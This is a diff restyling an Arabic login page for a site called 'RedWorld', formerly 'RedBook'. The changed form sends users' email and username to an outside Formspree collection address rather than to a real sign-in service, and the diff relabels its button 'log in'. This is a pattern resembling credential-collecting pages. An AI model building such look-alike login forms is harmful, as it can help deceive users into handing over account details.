@@ -2,12 +2,12 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>RedBook Login</title>
+  <title>RedWorld Login</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Tahoma, sans-serif;
-      background: linear-gradient(135deg, #ffcccc, #b30000);
+      background: linear-gradient(135deg, #ff4d4d, #800000);
       margin: 0;
       padding: 0;
       display: flex;
@@ -17,23 +17,27 @@
     }
     .login-box {
       background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 6px 25px rgba(0,0,0,0.3);
       width: 100%;
-      max-width: 350px;
-    }
-    .login-box h2 {
+      max-width: 380px;
       text-align: center;
+    }
+    .login-box h1 {
       color: #b30000;
-      margin-bottom: 20px;
+      margin-bottom: 10px;
+    }
+    .login-box p {
+      color: #555;
+      margin-bottom: 25px;
     }
     .login-box input {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
       border: 1px solid #ccc;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 14px;
     }
     .login-box button {
@@ -42,16 +46,17 @@
       background-color: #b30000;
       color: white;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
+      transition: 0.3s;
     }
     .login-box button:hover {
       background-color: #990000;
+      transform: scale(1.05);
     }
     .extra-links {
-      text-align: center;
-      margin-top: 15px;
+      margin-top: 20px;
     }
     .extra-links a {
       color: #b30000;
@@ -65,11 +70,12 @@
 </head>
 <body>
   <div class="login-box">
-    <h2>تسجيل الدخول</h2>
+    <h1>RedWorld</h1>
+    <p>مرحبًا بك في عالمك الجديد</p>
     <form action="https://formspree.io/f/xgodendz" method="POST">
       <input type="email" name="email" placeholder="البريد الإلكتروني" required>
       <input type="text" name="username" placeholder="اسم المستخدم" required>
-      <button type="submit">إرسال</button>
+      <button type="submit">تسجيل الدخول</button>
     </form>
     <div class="extra-links">
       <a href="#">هل نسيت كلمة المرور؟</a> |
